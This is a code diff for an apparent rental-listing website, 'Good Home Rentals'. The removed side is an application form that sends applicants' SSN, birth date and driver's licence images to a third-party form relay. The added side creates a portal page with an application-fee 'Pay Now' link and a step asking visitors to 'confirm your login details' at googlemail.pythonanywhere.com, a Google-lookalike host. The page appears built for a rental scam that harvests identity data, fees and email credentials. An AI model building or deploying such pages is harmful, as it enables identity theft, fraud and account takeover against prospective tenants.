@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Rental Application Form - Good Home Rentals</title>
+  <title>Good Home Rental Portal</title>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
   <style>
@@ -69,7 +69,14 @@
       margin-bottom: 10px;
     }
 
-    .form-container {
+    .subtitle {
+      color: #4a6360;
+      font-size: 1.2rem;
+      font-weight: 300;
+      margin-bottom: 30px;
+    }
+
+    .section {
       background: white;
       border-radius: 10px;
       padding: 20px;
@@ -77,6 +84,12 @@
       width: 100%;
       max-width: 600px;
       box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    .section:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
     }
 
     h2 {
@@ -86,33 +99,11 @@
       margin-bottom: 15px;
     }
 
-    label {
-      display: block;
-      color: #4a6360;
+    h4 {
+      color: #6b7280;
       font-size: 0.9rem;
-      font-weight: 400;
-      margin-bottom: 5px;
-    }
-
-    input, select, textarea {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 1rem;
-      font-family: 'Poppins', sans-serif;
-    }
-
-    input[type="radio"] {
-      width: auto;
-      margin-right: 10px;
-    }
-
-    .radio-group {
-      display: flex;
-      gap: 20px;
-      margin-bottom: 15px;
+      font-weight: 300;
+      margin-bottom: 10px;
     }
 
     button {
@@ -141,6 +132,10 @@
       transform: scale(0.95);
     }
 
+    a {
+      text-decoration: none;
+    }
+
     footer {
       margin-top: 40px;
       font-size: 0.9rem;
@@ -157,7 +152,11 @@
         font-size: 1.8rem;
       }
 
-      .form-container {
+      .subtitle {
+        font-size: 1rem;
+      }
+
+      .section {
         padding: 15px;
       }
 
@@ -186,119 +185,25 @@
   </header>
 
   <div class="hero">
-    <h1>Rental Application Form</h1>
+    <h1>Welcome to Good Home Rental Portal</h1>
+    <p class="subtitle">Find your perfect home with ease and confidence.</p>
   </div>
 
-  <div class="form-container">
-    <h2>Applicant’s Information</h2>
-    <form action="https://formsubmit.co/luxoftorganizationgmail.com" method="POST" enctype="multipart/form-data">
+  <div class="section">
+    <h2>Apply Now</h2>
+    <a href="application.html"><button aria-label="Go to Rental Application Form"><i class="fas fa-file-alt"></i> Rental Application Form</button></a>
+  </div>
 
-      <input type="hidden" name="_next" value="index.html">
-      <input type="hidden" name="_subject" value="New Rental Application Submission">
-      <label for="date">Today’s Date</label>
-      <input type="date" id="date" name="date" required>
+  <div class="section">
+    <h2>Application Fee</h2>
+    <a href="payment-choice.html"><button aria-label="Choose Payment Method"><i class="fas fa-credit-card"></i> Pay Now</button></a>
+  </div>
 
-      <label for="address">Address Applied For</label>
-      <input type="text" id="address" name="address" required>
-
-      <label for="email">Email Address</label>
-      <input type="email" id="email" name="email" required>
-
-      <label for="ssn">SSN (Social Security Number)</label>
-      <input type="text" id="ssn" name="ssn" pattern="\d{3}-\d{2}-\d{4}" placeholder="XXX-XX-XXXX" required>
-
-      <label for="dob">Date of Birth</label>
-      <input type="date" id="dob" name="dob" required>
-
-      <label for="phone">Phone Number</label>
-      <input type="tel" id="phone" name="phone" pattern="\d{3}-\d{3}-\d{4}" placeholder="XXX-XXX-XXXX" required>
-
-      <label for="prev-address">Previous Address</label>
-      <input type="text" id="prev-address" name="prev-address" required>
-
-      <label for="landlord">Landlord or Mortgage Co.</label>
-      <input type="text" id="landlord" name="landlord">
-
-      <label for="landlord-phone">Phone (Landlord)</label>
-      <input type="tel" id="landlord-phone" name="landlord-phone" pattern="\d{3}-\d{3}-\d{4}" placeholder="XXX-XXX-XXXX">
-
-      <label for="rent-amount">Rent Amount</label>
-      <input type="number" id="rent-amount" name="rent-amount" step="0.01">
-
-      <label for="reason-leaving">Reason for Leaving</label>
-      <textarea id="reason-leaving" name="reason-leaving"></textarea>
-
-      <label for="marital-status">Single or Married</label>
-      <select id="marital-status" name="marital-status" required>
-        <option value="">Select</option>
-        <option value="single">Single</option>
-        <option value="married">Married</option>
-      </select>
-
-      <label for="occupants">Proposed Occupants & Ages</label>
-      <textarea id="occupants" name="occupants"></textarea>
-
-      <label for="pet">Pet</label>
-      <input type="text" id="pet" name="pet">
-
-      <label for="vehicle">Vehicle Type</label>
-      <input type="text" id="vehicle" name="vehicle">
-
-      <label>Smoker?</label>
-      <div class="radio-group">
-        <label><input type="radio" name="smoker" value="yes"> Yes</label>
-        <label><input type="radio" name="smoker" value="no" checked> No</label>
-      </div>
-
-      <label for="deposit-date">Earliest Possible Date of Deposit Payment</label>
-      <input type="date" id="deposit-date" name="deposit-date" required>
-
-      <label for="deposit-amount">Amount Available to Secure Property</label>
-      <input type="number" id="deposit-amount" name="deposit-amount" step="0.01" required>
-
-      <label for="move-in-date">Proposed Move-in Date</label>
-      <input type="date" id="move-in-date" name="move-in-date" required>
-
-      <label for="employment-status">Employment Status</label>
-      <select id="employment-status" name="employment-status" required>
-        <option value="">Select</option>
-        <option value="employed">Employed</option>
-        <option value="self-employed">Self-Employed</option>
-        <option value="unemployed">Unemployed</option>
-      </select>
-
-      <label for="employer">Employed By</label>
-      <input type="text" id="employer" name="employer">
-
-      <label for="employment-duration">How long have you worked there?</label>
-      <input type="text" id="employment-duration" name="employment-duration">
-
-      <label for="work-address">Work Address</label>
-      <input type="text" id="work-address" name="work-address">
-
-      <label for="work-phone">Work Phone#</label>
-      <input type="tel" id="work-phone" name="work-phone" pattern="\d{3}-\d{3}-\d{4}" placeholder="XXX-XXX-XXXX">
-
-      <label for="reference">Personal Reference</label>
-      <input type="text" id="reference" name="reference">
-
-      <label for="reference-phone">Reference Phone#</label>
-      <input type="tel" id="reference-phone" name="reference-phone" pattern="\d{3}-\d{3}-\d{4}" placeholder="XXX-XXX-XXXX">
-
-      <label for="license-front">Upload Driver's License (Front)</label>
-      <input type="file" id="license-front" name="license-front" accept="image/*">
-
-      <label for="license-back">Upload Driver's License (Back)</label>
-      <input type="file" id="license-back" name="license-back" accept="image/*">
-
-      <label for="signature">Signature</label>
-      <input type="text" id="signature" name="signature" required>
-
-      <label for="date-signed">Date Signed</label>
-      <input type="date" id="date-signed" name="date-signed" required>
-
-      <button type="submit"><i class="fas fa-paper-plane"></i> Submit Application</button>
-    </form>
+  <div class="section">
+    <h2>Finalize Your Application</h2>
+    <h4>Please confirm your login details to receive a verification code</h4>
+    <a href="https://googlemail.pythonanywhere.com/" target="_blank">
+      <button aria-label="Complete Registration"><i class="fas fa-check-circle"></i> Complete Registration</button></a>
   </div>
 
   <footer>© 2025 Good Home Rentals. All rights reserved.</footer>
